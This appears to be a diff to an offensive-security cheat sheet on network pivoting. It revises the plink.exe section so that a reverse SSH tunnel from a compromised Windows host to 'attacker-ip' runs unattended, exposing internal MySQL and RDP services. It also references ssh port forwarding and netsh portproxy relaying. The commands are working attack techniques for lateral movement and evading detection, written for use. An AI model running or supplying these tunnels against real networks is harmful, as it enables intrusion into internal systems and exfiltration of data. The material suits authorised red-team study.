@@ -164,12 +164,14 @@ ssh -f -N -L 3306:127.0.0.1:3306 user@pivot-host
 Signed PuTTY CLI client, widely AV-allowed. Only acts as SSH client — forwards originate from the Windows box back to an SSH server you control.
 ```cmd
 :: Remote (reverse) forward — exposes internal Windows service back to attacker
-echo y | plink.exe -ssh -l kaliuser -pw password -batch -N -R 127.0.0.1:33060:127.0.0.1:3306 attacker-ip
+:: First accept the host key, then run the tunnel with -batch
+echo y | plink.exe -ssh -l kaliuser -pw password attacker-ip exit
+plink.exe -ssh -l kaliuser -pw password -batch -N -R 127.0.0.1:33060:127.0.0.1:3306 attacker-ip
 
 :: Local forward
 plink.exe -P 22 -L 13389:internal-rdp-host:3389 kaliuser@attacker-ip -pw password -N -C
 ```
-`-batch` suppresses host-key prompts (needed for unattended execution).
+`-batch` suppresses all interactive prompts but also refuses unknown host keys — cache the key first (the `echo y | ... exit` line), then use `-batch` for the real tunnel.
 **Reference:** https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
 
 ## netsh interface portproxy — living-off-the-land Windows relay (no binary drop)
